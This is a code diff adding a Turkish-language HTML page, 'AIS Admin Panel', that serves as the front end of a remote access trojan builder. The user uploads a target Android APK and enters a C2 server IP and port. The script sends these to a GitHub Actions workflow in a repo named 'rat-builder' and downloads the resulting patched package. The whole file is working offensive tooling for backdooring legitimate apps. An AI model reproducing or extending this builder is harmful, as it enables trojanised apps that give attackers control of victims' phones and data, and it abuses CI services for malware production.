@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AIS Admin Panel</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: #000;
+    color: #0f0;
+    font-family: monospace;
+    padding: 12px;
+    font-size: 13px;
+    line-height: 1.5;
+  }
+  .banner {
+    color: #0ff;
+    white-space: pre;
+    font-size: 9px;
+    line-height: 1.1;
+    margin-bottom: 8px;
+  }
+  .subtitle {
+    color: #ff0;
+    font-size: 12px;
+    margin-bottom: 16px;
+  }
+  .form { margin-bottom: 16px; }
+  label {
+    display: block;
+    color: #0f0;
+    margin-top: 8px;
+    margin-bottom: 4px;
+  }
+  input[type="text"], input[type="file"] {
+    width: 100%;
+    padding: 10px;
+    background: #111;
+    border: 1px solid #0f0;
+    color: #0f0;
+    font-family: monospace;
+    font-size: 13px;
+    border-radius: 4px;
+  }
+  input[type="file"] { padding: 6px; }
+  button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 12px;
+    background: #060;
+    color: #0f0;
+    border: 1px solid #0f0;
+    font-family: monospace;
+    font-size: 14px;
+    font-weight: bold;
+    cursor: pointer;
+    border-radius: 4px;
+  }
+  button:active { background: #0a0; }
+  button:disabled { background: #222; color: #555; border-color: #333; }
+  #buildBtn { background: #600; color: #f66; border-color: #f00; }
+  #buildBtn:active { background: #900; }
+  #log {
+    background: #050505;
+    border: 1px solid #0f0;
+    padding: 10px;
+    margin-top: 16px;
+    min-height: 200px;
+    max-height: 400px;
+    overflow-y: auto;
+    white-space: pre-wrap;
+    font-size: 11px;
+    border-radius: 4px;
+  }
+  .info { color: #0ff; }
+  .ok { color: #0f0; }
+  .err { color: #f00; }
+  .warn { color: #ff0; }
+  .divider {
+    border-top: 1px dashed #0f0;
+    margin: 16px 0;
+    opacity: 0.5;
+  }
+</style>
+</head>
+<body>
+
+<div class="banner">
+  █████╗ ██╗███████╗    ██████╗  █████╗ ████████╗
+ ██╔══██╗██║██╔════╝    ██╔══██╗██╔══██╗╚══██╔══╝
+ ███████║██║███████╗    ██████╔╝███████║   ██║
+ ██╔══██║██║╚════██║    ██╔══██╗██╔══██║   ██║
+ ██║  ██║██║███████║    ██║  ██║██║  ██║   ██║
+ ╚═╝  ╚═╝╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
+</div>
+<div class="subtitle">[ AIS ADMIN PANEL v3.0 — HTML ]<br>[ hedef APK + GitHub builder ]</div>
+
+<div class="form">
+  <label>GitHub Token (ghp_...)</label>
+  <input type="text" id="token" placeholder="ghp_xxxxxxxxxxxx" autocomplete="off">
+
+  <label>Repo (kullanıcı/ad)</label>
+  <input type="text" id="repo" value="Aiska/rat-builder">
+
+  <label>Workflow dosyası</label>
+  <input type="text" id="workflow" value="build.yml">
+
+  <label>Hedef APK (dosya seç)</label>
+  <input type="file" id="apkFile" accept=".apk">
+
+  <label>C2 IP</label>
+  <input type="text" id="c2host" value="192.168.1.10">
+
+  <label>C2 Port</label>
+  <input type="text" id="c2port" value="4444">
+
+  <button id="buildBtn" onclick="startBuild()">▶ PAYLOAD URET</button>
+</div>
+
+<div id="log"></div>
+
+<script>
+const GH_API = "https://api.github.com";
+let logEl;
+
+function log(msg, cls = "") {
+  logEl = logEl || document.getElementById("log");
+  const span = document.createElement("div");
+  if (cls) span.className = cls;
+  const t = new Date().toLocaleTimeString();
+  span.textContent = `[${t}] ${msg}`;
+  logEl.appendChild(span);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function b64Encode(bytes) {
+  let bin = "";
+  const chunk = 8192;
+  for (let i = 0; i < bytes.length; i += chunk) {
+    bin += String.fromCharCode.apply(null, bytes.subarray(i, i + chunk));
+  }
+  return btoa(bin);
+}
+
+function ghHeaders(token) {
+  return {
+    "Authorization": `token ${token}`,
+    "Accept": "application/vnd.github+json",
+    "Content-Type": "application/json",
+  };
+}
+
+async function startBuild() {
+  const token = document.getElementById("token").value.trim();
+  const repo = document.getElementById("repo").value.trim();
+  const workflow = document.getElementById("workflow").value.trim();
+  const fileInput = document.getElementById("apkFile");
+  const c2host = document.getElementById("c2host").value.trim();
+  const c2port = document.getElementById("c2port").value.trim();
+  const buildBtn = document.getElementById("buildBtn");
+
+  if (!token) { log("HATA: token bos", "err"); return; }
+  if (!repo.includes("/")) { log("HATA: repo formati 'kullanici/ad'", "err"); return; }
+  if (!fileInput.files.length) { log("HATA: APK secilmedi", "err"); return; }
+  if (!c2host) { log("HATA: C2 IP bos", "err"); return; }
+
+  buildBtn.disabled = true;
+  logEl.innerHTML = "";
+
+  try {
+    log("APK okunuyor...", "info");
+    const file = fileInput.files[0];
+    log(`dosya: ${file.name} (${(file.size / 1024 / 1024).toFixed(2)} MB)`, "info");
+
+    const arrayBuf = await file.arrayBuffer();
+    const apkB64 = b64Encode(new Uint8Array(arrayBuf));
+    log(`base64: ${apkB64.length} karakter`, "ok");
+
+    const url = `${GH_API}/repos/${repo}/actions/workflows/${workflow}/dispatches`;
+    const body = {
+      ref: "main",
+      inputs: {
+        apk_b64: apkB64,
+        c2_host: c2host,
+        c2_port: c2port,
+      }
+    };
+
+    log("workflow tetikleniyor...", "info");
+    const r = await fetch(url, {
+      method: "POST",
+      headers: ghHeaders(token),
+      body: JSON.stringify(body),
+    });
+
+    if (r.status !== 204) {
+      const txt = await r.text();
+      log(`HATA: tetikleme ${r.status}`, "err");
+      log(txt.substring(0, 300), "err");
+      buildBtn.disabled = false;
+      return;
+    }
+    log("workflow tetiklendi", "ok");
+
+    log("workflow bekleniyor (bu 25 dk surebilir)...", "warn");
+    const runId = await waitForRun(token, repo);
+    if (!runId) { log("HATA: calisma bulunamadi", "err"); buildBtn.disabled = false; return; }
+
+    log(`calisma id: ${runId}`, "info");
+    log("artifact indiriliyor...", "info");
+    await downloadArtifact(token, repo, runId);
+
+    log("BITTI", "ok");
+  } catch (e) {
+    log(`HATA: ${e.message}`, "err");
+  }
+  buildBtn.disabled = false;
+}
+
+async function waitForRun(token, repo, timeoutMs = 1800000) {
+  const start = Date.now();
+  const url = `${GH_API}/repos/${repo}/actions/runs?per_page=3`;
+  let lastStatus = "";
+  while (Date.now() - start < timeoutMs) {
+    try {
+      const r = await fetch(url, { headers: ghHeaders(token) });
+      if (r.status !== 200) {
+        log(`API ${r.status}`, "err");
+        await sleep(15000);
+        continue;
+      }
+      const data = await r.json();
+      const runs = data.workflow_runs || [];
+      if (runs.length) {
+        const run = runs[0];
+        if (run.status !== lastStatus) {
+          log(`durum: ${run.status}`, run.status === "completed" ? "ok" : "warn");
+          lastStatus = run.status;
+        }
+        if (run.status === "completed") return run.id;
+      }
+    } catch (e) {
+      log(`bekleme: ${e.message}`, "warn");
+    }
+    await sleep(15000);
+  }
+  return null;
+}
+
+async function downloadArtifact(token, repo, runId) {
+  const url = `${GH_API}/repos/${repo}/actions/runs/${runId}/artifacts`;
+  const r = await fetch(url, { headers: ghHeaders(token) });
+  if (r.status !== 200) { log(`artifact API ${r.status}`, "err"); return; }
+  const data = await r.json();
+  const arts = data.artifacts || [];
+  if (!arts.length) { log("artifact yok", "err"); return; }
+  const art = arts[0];
+  log(`artifact: ${art.name} (${(art.size_in_bytes / 1024 / 1024).toFixed(2)} MB)`, "info");
+
+  const dlUrl = art.archive_download_url;
+  const dl = await fetch(dlUrl, { headers: ghHeaders(token), redirect: "follow" });
+  if (dl.status !== 200) { log(`indirme ${dl.status}`, "err"); return; }
+
+  const blob = await dl.blob();
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "patched.zip";
+  a.click();
+  log("indirildi: patched.zip (zipten cikar)", "ok");
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+log("hazir. token ve hedef APK gir.", "info");
+</script>
+
+</body>
+</html>
